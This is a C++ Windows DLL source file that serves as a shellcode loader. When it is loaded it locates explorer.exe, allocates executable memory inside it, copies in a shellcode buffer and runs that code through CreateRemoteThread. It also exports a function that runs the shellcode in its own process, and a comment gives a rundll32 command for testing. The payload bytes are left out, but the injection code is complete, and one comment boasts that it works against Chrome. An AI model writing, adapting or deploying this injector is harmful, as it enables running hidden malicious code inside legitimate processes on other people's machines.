// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

// Add shellcode here
unsigned char buf[] = ...


void RunExecuteShellcode(void);

DWORD WINAPI ThreadFunction(LPVOID lpParameter)
{
    LPVOID newMemory;
    HANDLE currentProcess;
    SIZE_T bytesWritten;
    BOOL didWeCopy = FALSE;

    // Get the current process handle 
    currentProcess = GetCurrentProcess();


    // Allocate memory with Read+Write+Execute permissions 
    newMemory = VirtualAllocEx(currentProcess, NULL, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (newMemory == NULL)
        return -1;

    // Copy the shellcode into the memory we just created 
    didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&buf, sizeof buf, &bytesWritten);

    if (!didWeCopy)
        return -2;

    // Yay! Let's run our shellcode! 
    ((void(*)())newMemory)();

    return 1;
}




int GetProcessPID(wchar_t* processName)
{
    int thePid = 0;

    PROCESSENTRY32 entry;

    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            //if (stricmp(entry.szExeFile, processName) == 0)
            if (wcscmp(entry.szExeFile, processName) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                thePid = entry.th32ProcessID;
                CloseHandle(hProcess);
            }
        }
    }

    CloseHandle(snapshot);

    return thePid;
}



// Works for DLL injection into Chrome!!!
void DoRemoteThread(void)
{
    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    wchar_t the_exe[32];
    //wcsncpy_s(the_exe, L"notepad.exe", 32);
    wcsncpy_s(the_exe, L"explorer.exe", 32);


    int thePID = GetProcessPID(the_exe);
    //int thePID = 10896;

    if (thePID != 0)
    {
        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(thePID));
        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL);
        remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
        CloseHandle(processHandle);
    }
}


BOOL WINAPI
DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    HANDLE threadHandle;
    threadHandle = hDll;

    //std::cout << "DllMain\n";

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        //printf("Process Attach\n");
        DoRemoteThread();
        break;
    case DLL_PROCESS_DETACH:
        // Code to run when the DLL is freed
        //printf("Process Detach\n");
        break;

    case DLL_THREAD_ATTACH:
        // Code to run when a thread is created during the DLL's lifetime
        //printf("Process Thread Attach\n");
        break;

    case DLL_THREAD_DETACH:
        // Code to run when a thread ends normally.
        //printf("Process Thread Detach\n");
        break;
    }
    return TRUE;
}

// To test execution: rundll32 my.dll,RunExecuteShellcode
void RunExecuteShellcode(void) {
    void* to_exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(to_exec, buf, sizeof buf);
    ((void(*)())to_exec)();
}

extern "C" __declspec(dllexport) void tester()
{
    RunExecuteShellcode();
}




